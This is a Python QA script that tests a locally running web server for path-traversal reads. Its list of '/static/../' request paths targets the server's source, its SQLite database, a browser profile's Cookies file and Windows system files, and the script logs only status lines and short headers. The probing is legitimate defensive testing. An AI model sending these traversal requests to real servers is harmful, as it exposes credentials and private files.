"""安全专项只读探测 · 第二轮（取证片段，临时 QA 脚本）。

补充第一轮缺失的「响应正文片段」证据；验证越界读取的实际边界。
不打印任何凭据/Cookie/密钥内容（仅记录状态与 SQLite 文件头 16 字节）。
结果写入 tools/_qa_security_probe2.out。
"""
from __future__ import annotations

import socket
from pathlib import Path

HOST, PORT = "127.0.0.1", 8765
OUT = Path(__file__).resolve().parent / "_qa_security_probe2.out"
lines: list[str] = []


def log(*a):
    lines.append(" ".join(str(x) for x in a))


def raw_get(target: str, max_body: int = 200_000) -> dict:
    req = (f"GET {target} HTTP/1.1\r\nHost: 127.0.0.1:{PORT}\r\n"
           f"User-Agent: qa-sec-probe\r\nAccept: */*\r\nConnection: close\r\n\r\n")
    try:
        with socket.create_connection((HOST, PORT), timeout=8) as s:
            s.sendall(req.encode("latin-1", "replace"))
            buf = b""
            while len(buf) < max_body:
                c = s.recv(65536)
                if not c:
                    break
                buf += c
    except Exception as e:  # noqa: BLE001
        return {"target": target, "error": f"{type(e).__name__}: {e}"}
    head, _, body = buf.partition(b"\r\n\r\n")
    status = head.decode("latin-1", "replace").split("\r\n")[0]
    return {"target": target, "status": status, "body": body}


log("=" * 78)
log("[D] 路径穿越 · 正文片段取证（只读；不打印任何凭据内容）")
log("=" * 78)

# (target, mode)  mode: text=打印前200字符 | hex16=仅打印SQLite文件头 | meta=只看状态
cases = [
    ("/static/../server.py", "text"),
    ("/static/../app.db", "hex16"),
    ("/static/../../.venv/pyvenv.cfg", "text"),
    ("/static/../../.browser-profile/Default/Network/Cookies", "hex16"),
    ("/static/../../main.py", "meta"),
    ("/static/../../../Windows/win.ini", "meta"),
    ("/static/../C:/Windows/win.ini", "meta"),
]
for t, mode in cases:
    r = raw_get(t, max_body=8192)
    if r.get("error"):
        log(f"  {t}\n      -> {r['error']}")
        continue
    body = r["body"]
    log(f"  {t}\n      -> {r['status']}  bytes_read={len(body)}")
    if not body:
        continue
    if mode == "hex16":
        log(f"      body[0:16] = {body[:16]!r}  （仅文件头，未取任何内容）")
    elif mode == "text":
        txt = body[:200].decode("utf-8", "replace").replace("\r", "").replace("\n", " \\n ")
        log(f"      body[0:200] = {txt!r}")
    else:
        log("      （仅记录状态码，正文未取样）")

log("")
log("=" * 78)
log("[E] 对照：不存在的文件 / 编码变体（预期 404）")
log("=" * 78)
for t in ("/static/../__not_exist__.py", "/static/%2e%2e%2fserver.py"):
    r = raw_get(t, max_body=4096)
    log(f"  {t:44s} -> {r.get('status', r.get('error'))}")

OUT.write_text("\n".join(lines) + "\n", encoding="utf-8")
print("written:", OUT)
